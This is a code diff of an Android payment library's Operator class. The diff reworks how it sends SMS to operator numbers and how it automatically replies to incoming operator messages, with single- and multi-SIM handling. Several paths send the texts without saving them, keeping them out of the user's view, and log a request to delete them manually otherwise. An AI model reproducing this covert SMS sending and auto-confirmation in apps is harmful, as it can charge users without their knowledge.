@@ -1,6 +1,7 @@
 package com.p2plib2.operators;
 
 
+import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.PendingIntent;
 import android.content.Context;
@@ -17,6 +18,7 @@ import java.util.HashMap;
 import java.util.HashSet;
 
 import static com.p2plib2.PayLib.flagok;
+import static com.p2plib2.PayLib.simCounter;
 
 public class Operator {
     /**
@@ -45,6 +47,7 @@ public class Operator {
     }
 
 
+    @SuppressLint("MissingPermission")
     public void sendSMS(Boolean sendWithSaveOutput, Context cnt) {
         String msgBody = createMsgBody();
         String number = getOperNum();
@@ -52,44 +55,42 @@ public class Operator {
         this.sendWithSaveOutput = sendWithSaveOutput;
         PendingIntent piSent = PendingIntent.getBroadcast(cnt, 0, new Intent("SMS_SENT"), 0);
         try {
-            Logger.lg(name + " num " + number + " " + sendWithSaveInput + " " + msgBody);
+            Logger.lg(name + " num " + number + " " + sendWithSaveInput + " " + msgBody + " " + simCounter);
             PayLib.currentMsg = number + "[]" + msgBody;
-            if (simNumSms != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    if (sendWithSaveOutput) {
-                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(number, null, msgBody, piSent, null);
-                    } else {
-                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessageWithoutPersisting(number, null, msgBody, piSent, null);
-                    }
-                } else {
-                    PayLib.feedback.callResult("Code P2P-007: current version " + Build.VERSION.SDK_INT + " not support multiSim");
-                }
-            } else {
-                if (sendWithSaveOutput) {
-                    smsManager.sendTextMessage(number, null, msgBody, piSent, null);
-                } else {
-                    Logger.lg("Build.VERSION.SDK_INT  " + Build.VERSION.SDK_INT + " " + Build.VERSION_CODES.P);
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(number, null, msgBody, piSent, null);
-                    }
+            if (simCounter == 1) {
+                if (!sendWithSaveOutput) {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                         smsManager.sendTextMessageWithoutPersisting(number, null, msgBody, piSent, null);
                     } else {
                         smsManager.sendTextMessage(number, null, msgBody, piSent, null);
                         PayLib.feedback.callResult("Code P2P-006: please, delete sms manually");
                     }
+                } else {
+                    smsManager.sendTextMessage(number, null, msgBody, piSent, null);
+                }
+            } else {
+                if (sendWithSaveOutput) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(number, null, msgBody, piSent, null);
+                    } else {
+                        PayLib.feedback.callResult("Code P2P-011: current Android version does not support multy sim");
+                    }
+                } else {
+                    Logger.lg("Build.VERSION.SDK_INT  " + Build.VERSION.SDK_INT + " " + Build.VERSION_CODES.P);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessageWithoutPersisting(number, null, msgBody, piSent, null);
+                    } else {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                            SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(number, null, msgBody, piSent, null);
+                        } else {
+                            PayLib.feedback.callResult("Code P2P-011: current Android version does not support multy sim");
+                        }
+                        PayLib.feedback.callResult("Code P2P-006: please, delete sms manually");
+                    }
                 }
             }
         } catch (Exception e) {
-            if (simNumSms != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(number, null, msgBody, piSent, null);
-                } else {
-                    smsManager.sendTextMessage(number, null, msgBody, piSent, null);
-                    PayLib.feedback.callResult("Code P2P-007: current version " + Build.VERSION.SDK_INT + " not support multiSim");
-                }
-                Logger.lg("Code P2P-008: " + e.getMessage());
-            }
+            Logger.lg("Code P2P-008: " + e.getMessage());
         }
     }
 
@@ -125,6 +126,7 @@ public class Operator {
         return msgBody;
     }
 
+    @SuppressLint("MissingPermission")
     public void sendAnswer(String smsBody, String smsSender) {
         String sms_body = smsBody.toLowerCase();
         Logger.lg("SendAnswer " + sms_body);
@@ -143,37 +145,48 @@ public class Operator {
             }
             Logger.lg("Answer  " + answ + " smsNum " + smsNum);
             PendingIntent piSent = PendingIntent.getBroadcast(cnt, 0, new Intent("SMS_SENT"), 0);
-            if (simNumSms != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    if (sendWithSaveOutput) {
-                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(smsNum, null, answ, piSent, null);
-                    } else {
-                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessageWithoutPersisting(smsNum, null, answ, piSent, null);
-                    }
-                } else {
-                    PayLib.feedback.callResult("Code P2P-007: current version " + Build.VERSION.SDK_INT + " not support multiSim");
-                }
-            } else {
-                if (sendWithSaveOutput) {
-                    smsManager.sendTextMessage(smsNum, null, answ, null, null);
-                } else {
-                    Logger.lg("Build.VERSION.SDK_INT  " + Build.VERSION.SDK_INT + " " + Build.VERSION_CODES.P);
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                        SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(smsNum, null, answ, piSent, null);
-                    }
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                        smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, piSent, null);
+            try {
+                  PayLib.currentMsg = smsNum + "[]" + answ;
+                if (simCounter == 1) {
+                    if (!sendWithSaveOutput) {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, piSent, null);
+                        } else {
+                            smsManager.sendTextMessage(smsNum, null, answ, piSent, null);
+                            PayLib.feedback.callResult("Code P2P-006: please, delete sms manually");
+                        }
                     } else {
                         smsManager.sendTextMessage(smsNum, null, answ, piSent, null);
-                        PayLib.feedback.callResult("Code P2P-006: please, delete sms manually");
+                    }
+                } else {
+                    if (sendWithSaveOutput) {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                            SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(smsNum, null, answ, piSent, null);
+                        } else {
+                            PayLib.feedback.callResult("Code P2P-011: current Android version does not support multy sim");
+                        }
+                    } else {
+                        Logger.lg("Build.VERSION.SDK_INT  " + Build.VERSION.SDK_INT + " " + Build.VERSION_CODES.P);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessageWithoutPersisting(smsNum, null, answ, piSent, null);
+                        } else {
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                                SmsManager.getSmsManagerForSubscriptionId(simNumSms).sendTextMessage(smsNum, null, answ, piSent, null);
+                            } else {
+                                PayLib.feedback.callResult("Code P2P-011: current Android version does not support multy sim");
+                            }
+                            PayLib.feedback.callResult("Code P2P-006: please, delete sms manually");
+                        }
                     }
                 }
+            } catch (Exception e) {
+                Logger.lg("Code P2P-008: " + e.getMessage());
             }
+
         } else {
             Logger.lg("Error! " + sms_body);
             PayLib.getSMSResult("Code : " + sms_body);
         }
-
     }
 
 
